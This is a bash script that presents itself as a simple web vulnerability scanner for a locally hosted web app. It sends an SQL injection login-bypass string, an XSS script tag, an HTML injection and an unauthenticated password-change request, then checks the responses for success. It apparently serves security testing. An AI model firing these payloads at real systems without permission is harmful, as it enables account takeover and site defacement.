#!/bin/bash

# Base URL of the target web app (Modify as needed)
BASE_URL="http://localhost:3000"

# Function to check if target is online
function check_target() {
    echo "[*] Checking if $BASE_URL is accessible..."
    if curl -s --head --request GET "$BASE_URL" | grep "200 OK" > /dev/null; then
        echo "[+] Target is up! Proceeding with tests..."
    else
        echo "[-] Target is not responding. Exiting."
        exit 1
    fi
}

# Function to test SQL Injection
function test_sql_injection() {
    echo "[*] Testing for SQL Injection..."
    
    response=$(curl -s -X POST "$BASE_URL/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email": "\" OR 1=1 --", "password": "password"}')

    if echo "$response" | grep -q "authentication succeeded"; then
        echo "[+] SQL Injection vulnerability detected!"
    else
        echo "[-] No SQL Injection detected."
    fi
}

# Function to test XSS
function test_xss() {
    echo "[*] Testing for XSS vulnerabilities..."
    
    response=$(curl -s -X POST "$BASE_URL/feedback" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data-urlencode "comment=<script>alert('XSS')</script>")

    if echo "$response" | grep -q "<script>alert('XSS')</script>"; then
        echo "[+] XSS vulnerability detected!"
    else
        echo "[-] No XSS detected."
    fi
}

# Function to check CSRF vulnerability
function test_csrf() {
    echo "[*] Testing for CSRF vulnerabilities..."
    
    response=$(curl -s -X POST "$BASE_URL/rest/user/change-password" \
        -H "Content-Type: application/json" \
        -d '{"new": "hacked_password", "repeat": "hacked_password"}')

    if echo "$response" | grep -q "success"; then
        echo "[+] Possible CSRF vulnerability detected!"
    else
        echo "[-] CSRF protection seems active."
    fi
}

# Function to test HTML Injection
function test_html_injection() {
    echo "[*] Testing for HTML Injection..."
    
    response=$(curl -s -X POST "$BASE_URL/feedback" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --data-urlencode "comment=<h1>Hacked!</h1>")

    if echo "$response" | grep -q "<h1>Hacked!</h1>"; then
        echo "[+] HTML Injection vulnerability detected!"
    else
        echo "[-] No HTML Injection detected."
    fi
}

# Main Function
function main() {
    echo "===== Starting Bash Security Scanner ====="
    
    check_target
    test_sql_injection
    test_xss
    test_csrf
    test_html_injection
    
    echo "===== Security Scan Completed ====="
}

# Execute main function
main
